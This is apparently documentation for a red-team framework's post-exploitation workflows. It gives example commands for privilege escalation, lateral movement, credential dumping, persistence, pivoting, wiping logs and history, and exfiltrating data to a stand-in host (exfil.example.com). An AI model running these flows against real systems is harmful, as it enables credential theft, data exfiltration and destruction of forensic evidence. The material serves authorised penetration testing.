# Post-Exploitation Workflows

Privilege escalation, lateral movement, credential dumping, persistence, exfiltration, OPSEC, and pivoting.

## Workflows

### privesc
Enumerate escalation vectors on compromised Linux and Windows hosts.
```bash
ofx flow run privesc --input os_type=linux
```
Uses: linpeas.sh, lse.sh, winPEASx64.exe

### lateral-movement
Test discovered credentials across internal hosts via SMB, WinRM, SSH, RDP.
```bash
ofx flow run lateral-movement --input target=10.0.0.0/24 --input username=admin --input password=Pass123
```
Uses: nxc

### credential-dump
Extract credentials using secretsdump, SAM, and LSASS dumping.
```bash
ofx flow run credential-dump --input target=10.0.0.5 --input username=admin --input password=Pass123
```
Uses: impacket-secretsdump, nxc

### persistence
Establish persistent access via SSH keys, cron jobs, scheduled tasks.
```bash
ofx flow run persistence --input target=10.0.0.5 --input username=admin --input password=Pass123 --input lhost=10.0.0.1 --input method=ssh-key
```

### exfil
Compress and exfiltrate data via HTTP POST, DNS tunneling, or SCP.
```bash
ofx flow run exfil --input target=/path/to/loot --input method=http --input server=https://exfil.example.com
```

### situational-awareness
Quick host enumeration after initial access — users, network, processes, defenses.
```bash
ofx flow run situational-awareness --input os_type=linux
```

### opsec-cleanup
Clear shell history, wipe logs, remove forensic artifacts.
```bash
ofx flow run opsec-cleanup --input os_type=linux --input aggressive=false
```

### pivot
Set up SSH tunnels, SOCKS proxies, chisel/ligolo for network pivoting.
```bash
ofx flow run pivot --input lhost=10.0.0.1 --input method=ssh --input pivot_host=10.0.0.5
```
